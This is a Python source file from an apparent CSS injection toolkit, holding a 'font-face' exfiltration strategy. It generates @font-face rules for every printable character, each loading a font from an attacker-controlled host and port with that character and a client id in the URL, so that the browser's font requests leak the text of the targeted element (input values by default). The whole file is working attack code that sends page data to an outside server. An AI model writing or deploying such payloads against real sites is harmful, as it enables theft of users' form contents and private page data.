import urllib.parse

from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils import default
from cssinj.utils.dom import Element


class FontFaceStrategy(BaseExfiltrationStrategy):
    """
    Font face exfiltration strategy.
    Exfiltrates the DOM structure of the HTML using font faces.
    """

    name = "font-face"

    def __init__(self, hostname: str, port: int, element: str = "input", attribut: str = "value") -> None:
        self.element = element
        self.attribut = attribut
        super().__init__(hostname, port)

    def generate_start_payload(self, client) -> str:
        return self._generate_font_face(client)

    def generate_next_payload(self, client) -> str:
        return self._generate_font_face(client)

    def handle_valid(self, client, data: str) -> str:
        element = Element(name=client.data)
        client.elements.append(element)
        return "valid"

    def handle_end(self, client) -> None:
        return "end"

    def _generate_font_face(self, client) -> str:
        stri = ""
        for char in default.PRINTABLE:
            stri += (
                f'@font-face{{font-family:e;src:url("//{self.hostname}:{self.port}/v?cid={client.id}&t={urllib.parse.quote_plus(char)}");'
                f"unicode-range:U+{ord(char):04X};}}"
            )
        stri += f"{self.element}{{font-family:e;}}"

        return stri
